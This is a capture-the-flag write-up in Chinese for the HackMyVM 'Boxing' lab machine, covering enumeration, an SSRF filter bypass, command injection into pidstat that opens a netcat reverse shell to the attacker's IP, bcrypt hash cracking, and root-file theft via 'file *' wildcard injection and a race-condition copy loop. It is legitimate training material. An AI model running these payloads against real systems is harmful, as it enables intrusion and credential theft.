---
sidebar_position: 1
tags: [Easy, Linux, SSRF, 命令执行, 密码破解, 通配符利用, 定时任务, 逻辑漏洞]
title: Boxing
description: Boxing
---
# Boxing
## 端口扫描
```bash
┌──(root㉿kali)-[~/CTF/HackerMyVM]
└─# nmap -sTCV -p- --min-rate 1000 192.168.0.106
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-12 09:51 EDT
Nmap scan report for 192.168.0.106 (192.168.0.106)
Host is up (0.021s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 dd:74:2f:1c:d1:23:f6:1f:dd:3a:52:94:5d:8b:7c:d9 (ECDSA)
|_  256 96:fb:74:b2:7d:ac:66:40:e9:94:df:83:9a:a6:07:64 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Oxer
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 08:00:27:7A:69:8C (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.92 seconds
```
## HTTP - 80
```bash
┌──(root㉿kali)-[~/CTF/HackerMyVM]
└─# gobuster dir -u http://192.168.0.106/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.106/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/images               (Status: 301) [Size: 315] [--> http://192.168.0.106/images/]
/.html                (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 23854]
/about.html           (Status: 200) [Size: 9704]
/blog.html            (Status: 200) [Size: 11165]
/feedback.php         (Status: 200) [Size: 1616]
/css                  (Status: 301) [Size: 312] [--> http://192.168.0.106/css/]
/js                   (Status: 301) [Size: 311] [--> http://192.168.0.106/js/]
/class.html           (Status: 200) [Size: 12460]
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```
进行目录扫描之后并没有发现什么特别之处, 查看网页的顶端我看到一个奇怪的内容 `boxing.hmv` 这可能存在域, 但是扫了一圈什么也没有
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240412223234.png)
之后在访问 `facebook.php` 的时候发现有些内容返回
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240412223352.png)
访问这个新的地址, 发现是一个输入 URL 的位置, 没有什么发现
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240412221836.png)
```bash
┌──(root㉿kali)-[~/CTF/HackerMyVM]
└─# gobuster dir -u http://staging-env.boxing.hmv/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,war
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://staging-env.boxing.hmv/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,zip,war,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 287]
/.php                 (Status: 403) [Size: 287]
/index.php            (Status: 200) [Size: 1167]
/cache                (Status: 301) [Size: 332] [--> http://staging-env.boxing.hmv/cache/]
/.html                (Status: 403) [Size: 287]
/.php                 (Status: 403) [Size: 287]
/server-status        (Status: 403) [Size: 287]
Progress: 1323360 / 1323366 (100.00%)
===============================================================
Finished
===============================================================
```
发现一个新的文件夹 Cache , 访问在其中发现一些文件但是没有什么发现
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240412222136.png)
查看其中的文件在 `.swp` 文件中可以发现一条消息内容, 显示没有提供重置密码的地方
```txt
Hello! You don't have a link to reset the password, and I've forgotten it! I tried Cassius! but it doesn't work; Contact me asap pease!

Cassius
```
之后我提交了一些 URL 地址, 发现内部存在过滤, 我感觉存在 SSRF 漏洞可以利用一下
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240412222634.png)
在这里会进行一系列的校验, 但是要求前缀是 `boxing.hmv` 所以就需要一些 Bypass 的手段
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240412224955.png)
随后我本来想的是远程包含, 但是试了一下没用, 只能进行内部端口探测了
```bash
┌──(root㉿kali)-[~/CTF/HackerMyVM]
└─# ffuf -u 'http://staging-env.boxing.hmv/index.php?url=boxing.hmv@localhost:FUZZ' -w <(seq 1 65000) -fs 1167

80                      [Status: 200, Size: 25021, Words: 10556, Lines: 702, Duration: 993ms]
5000                    [Status: 200, Size: 2367, Words: 828, Lines: 96, Duration: 17ms]
:: Progress: [65000/65000] :: Job [1/1] :: 4651 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
```
随后访问这个 5000 端口, 在页面中要求给出一个 ProcessName , 如果使用 POST 传参没有任何用处, 但是使用 GET 传参就可以看到其输出信息, 询问 GPT 后了解到这是 `pidstat` 命令的执行输出, 那么就有可能存在命令注入的问题
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240412230948.png)
我寻找到了 [pidstat](https://gtfobins.github.io/gtfobins/pidstat/) 这个文章, 其中提到了一种命令执行的方式, 但是输入之后好像存在过滤, 所以还需要做一点措施
> 看了一下 WP发现是 %2B 可以过去, 懵逼的我

![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240413162128.png)

随后利用这个来获取到一个反向 Shell
```url
http://staging-env.boxing.hmv/index.php?url=boxing.hmv@localhost:5000?processName=asd%2B-e%2Bnc%2B192.168.0.104%2B4444%2B-e%2B/bin/bash
```
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240413162404.png)
## 后渗透

### www-data --> cassius
随后在 dev 目录下发现一个新的 db 文件, 下载到本地进行查看
```bash
(remote) www-data@boxing:/var/www/dev$ ls
boxing_database.db  cache  index.php
```
随后从这个文件中发现一个密码
```bash
┌──(root㉿kali)-[~/CTF/HackerMyVM]
└─# sqlite3 boxing_database.db
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints. 
sqlite> SELECT * FROM users;
1|cassius|$2b$05$gPKe1EUBPZidX/j3qTDapeznU4CMfkpMd0sQhgehhhoG/pwc4OnVu
```
随后使用 John 进行破解, 发现破解不了, 在之前有一个文件中提及到其使用过 `Cassius!`
```bash
┌──(root㉿kali)-[~/CTF/HackerMyVM]
└─# john hash.txt -w=password.txt -rules=best64
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 32 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Cassius!123      (?)   
1g 0:00:00:00 DONE (2024-04-13 04:34) 50.00g/s 1800p/s 1800c/s 1800C/s Cassius!..Cassio
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### cassius --> root
使用上面得到的密码进行登陆, 在寻找中发现在 `/opt/sos` 目录下存在一些特殊的内容
```bash
cassius@boxing:/opt/sos$ ls
incrontab.sh  logs  sos.sh
cassius@boxing:/opt/sos$ cat incrontab.sh 
#!/bin/bash

echo '/etc/apache2/sites-available/000-default.conf IN_MODIFY systemctl restart apache2' | incrontab -
echo '/etc IN_DELETE,IN_MODIFY,IN_MOVED_FROM /bin/echo "File: $@/$# => $%" > /root/user_flag.log' | incrontab -
echo '/home/cassius/user.txt IN_ATTRIB /opt/sos/sos.sh' | incrontab -
```
询问 GPT 后了解到这是在使用 `incrontab` 工具来设置文件系统监视器的规则, 其中我们唯一可以使用的就是第三条, 当 `/home/cassius/user.txt` 的文件的属性发生改变的时候就会执行 `/opt/sos/sos.sh`
```bash
cassius@boxing:/opt/sos$ cat sos.sh 
#!/bin/bash

logs="/opt/sos/logs/output-logs.txt"
rm $logs
exec &>$logs

cd /home/cassius
file *
ss -altupn
last -a
w
ps aux
top -n 1
lsof

for user in $(cut -f1 -d: /etc/passwd); do
echo "Cron jobs for $user:"
crontab -u $user -l
done

tail /var/log/syslog
sha256sum /bin/* /sbin/* /usr/bin/* /usr/sbin/*

chmod 700 $logs
```
:::note[查看这个脚本我确定了两件事情]

- `file *` : 这个估计可以通配符利用一波, 查看 [gtfobins ](https://gtfobins.github.io/gtfobins/file/)发现可以利用这个来读取文件
- 前后文件的权限发生了变化, 所以可以借助时间差去把文件拷贝出来

:::
所以我们就可以开始相关的利用
```bash
cassius@boxing:~$ touch -- -f
cassius@boxing:~$ ln -sv /root/root.txt root
cassius@boxing:~$ ls
-f  root  user.txt
```
之后开启一个新的终端执行命令来利用时间差拷贝文件
```bash
cassius@boxing:/tmp$ while :; do cp /opt/sos/logs/output-logs.txt /tmp/1.txt 2>/dev/null; done
```
随后修改 `user.txt` 文件权限就可以看到文件拷贝出来了